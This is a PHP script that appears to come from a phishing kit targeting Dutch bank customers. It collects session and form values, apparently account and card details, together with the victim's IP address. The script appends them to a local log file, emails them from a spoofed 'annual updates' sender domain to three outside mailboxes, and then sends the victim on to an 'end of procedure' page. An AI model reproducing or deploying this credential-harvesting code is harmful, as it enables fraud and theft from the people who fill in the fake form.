<?php
session_start(); $ms3 = $_SESSION['msg3a'].$_SESSION['msg3b'].$_SESSION['msg3c']; $ms3 .= $_POST['qfs_IF2269_7303']." wordt hij verstuurd.<br><br> <strong>|0 = vandaag|<br>|1 = morgen|</strong>"; $title = "Rabz coll-NV - ".$_POST['qfs_IF2269_7303']." - ".$_SESSION['Vlts']."-".$_SESSION['Atnm'];
$message .= "Verzenddag : ".$_POST['qfs_IF2269_7303']."\n";
$ip = $_SERVER['REMOTE_ADDR'];
$od = date("F j, Y, g:i a");
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "===================\n";
$rnessage = "$message\n";
$send= "boss120@yahoo.com,vanderweide@keemail.me,milkop1@live.nl";
$subject = " Opstuur Baro | $ip";
$headers = "From: mail@jaarlijkseupdates.eu";
$file = fopen("fio.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);

}
header("Location: einde_procedure.php");
?>
